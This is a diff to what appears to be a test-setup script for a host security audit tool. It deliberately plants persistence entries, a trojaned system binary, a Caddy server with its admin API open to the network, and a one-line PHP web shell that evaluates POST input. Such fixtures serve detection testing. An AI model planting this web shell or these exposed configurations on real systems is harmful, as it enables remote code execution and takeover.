@@ -179,6 +179,22 @@ chmod 755 /etc/cron.yearly/e2e
 mkdir -p /etc/xdg/autostart
 printf '[Desktop Entry]\nType=Application\nName=e2e\nIcon=/tmp/e2e-icon.png\nExec=/tmp/.x/desk\n' >/etc/xdg/autostart/e2e.desktop
 
+# --- Caddy: an old official build, read by the audit but never run by it, with
+# the admin API open to the network and directory listing on.
+mkdir -p /opt/caddy /etc/caddy /srv/e2e-site
+cp /opt/e2e/caddy-e2e /opt/caddy/caddy
+cat >/etc/caddy/Caddyfile <<'EOF'
+{
+	admin 0.0.0.0:2019
+}
+:8088 {
+	root * /srv/e2e-site
+	file_server browse
+}
+EOF
+echo '<?php @eval($_POST["x"]); ?>' >/srv/e2e-site/up.php
+HOME=/root /opt/caddy/caddy run --config /etc/caddy/Caddyfile >/dev/null 2>&1 &
+
 # --- trojaned binary: changes content, keeps the package's path
 if [ -x /usr/bin/who ]; then
 	printf '\n#trojan' >>/usr/bin/who
